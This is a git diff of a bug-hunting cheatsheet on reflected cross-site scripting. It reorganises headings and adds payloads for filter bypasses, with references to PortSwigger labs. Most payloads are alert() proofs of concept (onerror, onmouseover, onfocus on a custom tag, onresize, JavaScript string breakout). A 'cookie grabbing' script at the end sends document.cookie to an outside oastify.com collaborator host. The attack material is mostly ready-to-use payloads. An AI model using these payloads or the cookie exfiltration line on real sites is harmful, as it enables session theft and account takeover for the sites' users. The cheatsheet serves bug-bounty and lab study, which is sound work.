@@ -49,7 +49,8 @@ y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
 <a href="javascript:alert('XSS')">Click me</a>
 <img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
-# Reflected XSS into HTML attribute with angle brackets HTML-encoded
+## Angle brackets HTML-encoded bypass
+### Reflected XSS into HTML attribute with angle brackets HTML-encoded
 Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
   ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
 If this is the case, you should inject this payloads. 
@@ -60,7 +61,7 @@ If this is the case, you should inject this payloads.
 " onmouseover="alert(1)
 ```
 ![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
-# Reflected XSS into a JavaScript string with angle brackets HTML encoded
+### Reflected XSS into a JavaScript string with angle brackets HTML encoded
 Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
 ![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
 In this case you should try this payload to braek the code to inject maliciuos payload.
@@ -70,14 +71,20 @@ xss';alert(1);'xss
 ```
 Finally the code will look like this after response.
 ![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
-# Reflected XSS into HTML context with most tags and attributes blocked
+## Tags and Attribute Block Bypass
+### Reflected XSS into HTML context with most tags and attributes blocked
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
-## Reflected XSS into HTML context with all tags blocked except custom ones
+```
+"><body onresize=alert(1337)>
+```
+### Reflected XSS into HTML context with all tags blocked except custom ones
 ###### Key Note
 ```tabindex="1"```, ```id="a1"```, ```#a1```
 ```
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
 ```
+### Reflected XSS with some SVG markup allowed
+
 #### For cookie grabbing
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
